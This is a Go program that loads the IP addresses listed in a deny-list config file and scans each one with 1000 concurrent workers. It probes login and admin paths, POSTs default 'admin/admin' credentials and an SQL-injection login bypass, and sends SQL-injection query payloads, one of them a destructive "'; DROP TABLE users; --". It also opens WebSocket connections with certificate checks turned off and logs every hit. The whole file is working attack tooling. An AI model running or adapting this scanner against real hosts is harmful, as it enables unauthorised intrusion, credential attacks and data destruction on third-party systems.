package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"golang.org/x/net/websocket"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sync"
	"time"
)

const (
	filePath    = "./deny_ips.conf"
	outputFile  = "./webscan/results.txt"
	reportFile  = "./webscan/report.txt"
	timeout     = 5 * time.Second
	workerCount = 1000
)

var (
	totalRequests   int
	successRequests int
	failedRequests  int
	mutex           sync.Mutex
)

var commonPaths = []string{
	"/login.php", "/admin", "/user/login.php", "/api/login", "/index.php",
}

var sqlInjectionPayloads = []string{
	"' OR 1=1 --", "' OR 'a'='a", "'; DROP TABLE users; --",
}

var postPayloads = []string{
	"username=admin&password=admin",
	"username=admin&password=' OR 1=1 --",
}

var websocketPaths = []string{
	"/ws", "/websocket", "/chat",
}

func extractIPs(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var ips []string
	re := regexp.MustCompile(`deny\s+([0-9\.]+);`)
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if matches := re.FindStringSubmatch(line); len(matches) == 2 {
			ips = append(ips, matches[1])
		}
	}
	return ips, scanner.Err()
}

func logToFile(path, content string) {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
	if err != nil {
		fmt.Println("❌ 写入失败:", err)
		return
	}
	defer f.Close()
	writer := bufio.NewWriter(f)
	writer.WriteString(content + "\n")
	writer.Flush()
}

func updateStats(success bool) {
	mutex.Lock()
	defer mutex.Unlock()
	totalRequests++
	if success {
		successRequests++
	} else {
		failedRequests++
	}
}

func httpScan(ip, schema string, client *http.Client) {
	for _, path := range commonPaths {
		url := fmt.Sprintf("%s://%s%s", schema, ip, path)
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("User-Agent", "SuperScanner/2.0")
		resp, err := client.Do(req)
		if err == nil {
			resp.Body.Close()
			updateStats(true)
			if resp.StatusCode == 200 || resp.StatusCode == 403 {
				logToFile(outputFile, fmt.Sprintf("[GET] %s -> %d", url, resp.StatusCode))
			}
		} else {
			updateStats(false)
		}
	}
}

func postScan(ip, schema string, client *http.Client) {
	for _, path := range commonPaths {
		for _, payload := range postPayloads {
			url := fmt.Sprintf("%s://%s%s", schema, ip, path)
			req, _ := http.NewRequest("POST", url, bytes.NewBuffer([]byte(payload)))
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			req.Header.Set("User-Agent", "SuperScanner/2.0")
			resp, err := client.Do(req)
			if err == nil {
				resp.Body.Close()
				updateStats(true)
				if resp.StatusCode == 200 {
					logToFile(outputFile, fmt.Sprintf("[POST] %s -> %d", url, resp.StatusCode))
				}
			} else {
				updateStats(false)
			}
		}
	}
}

func sqlInjectionScan(ip, schema string, client *http.Client) {
	for _, path := range commonPaths {
		for _, payload := range sqlInjectionPayloads {
			url := fmt.Sprintf("%s://%s%s?search=%s", schema, ip, path, url.QueryEscape(payload))
			req, _ := http.NewRequest("GET", url, nil)
			req.Header.Set("User-Agent", "SuperScanner/2.0")
			resp, err := client.Do(req)
			if err == nil {
				resp.Body.Close()
				updateStats(true)
				if resp.StatusCode == 200 {
					logToFile(outputFile, fmt.Sprintf("[SQLi] %s -> %d", url, resp.StatusCode))
				}
			} else {
				updateStats(false)
			}
		}
	}
}

func websocketScan(ip, schema string) {
	origin := fmt.Sprintf("%s://%s", schema, ip)
	for _, path := range websocketPaths {
		wsURL := fmt.Sprintf("ws://%s%s", ip, path)
		if schema == "https" {
			wsURL = fmt.Sprintf("wss://%s%s", ip, path)
		}
		config, err := websocket.NewConfig(wsURL, origin)
		if err != nil {
			updateStats(false)
			continue
		}
		config.TlsConfig = &tls.Config{InsecureSkipVerify: true}
		ws, err := websocket.DialConfig(config)
		if err == nil {
			msg := "test"
			websocket.Message.Send(ws, msg)
			var reply string
			websocket.Message.Receive(ws, &reply)
			ws.Close()
			updateStats(true)
			logToFile(outputFile, fmt.Sprintf("[WS] %s 回复: %s", wsURL, reply))
		} else {
			updateStats(false)
		}
	}
}

func scan(ip string, wg *sync.WaitGroup, sem chan struct{}) {
	defer wg.Done()
	defer func() { <-sem }()

	schema := "http"
	client := &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	httpScan(ip, schema, client)
	postScan(ip, schema, client)
	sqlInjectionScan(ip, schema, client)
	websocketScan(ip, schema)
}

func printReport(start time.Time) {
	duration := time.Since(start)
	report := fmt.Sprintf("=== 压测报告 ===\n总请求: %d\n成功: %d\n失败: %d\n耗时: %s\n并发: %d/s\n",
		totalRequests, successRequests, failedRequests, duration, totalRequests/int(duration.Seconds()))
	fmt.Println(report)
	logToFile(reportFile, report)
}

func main() {
	ips, err := extractIPs(filePath)
	if err != nil || len(ips) == 0 {
		fmt.Println("❌ IP 文件加载失败")
		return
	}

	fmt.Printf("✅ 开始扫描 %d 个目标，每秒并发 %d\n", len(ips), workerCount)
	start := time.Now()

	var wg sync.WaitGroup
	sem := make(chan struct{}, workerCount)

	for _, ip := range ips {
		wg.Add(1)
		sem <- struct{}{}
		go scan(ip, &wg, sem)
	}

	wg.Wait()
	printReport(start)
}
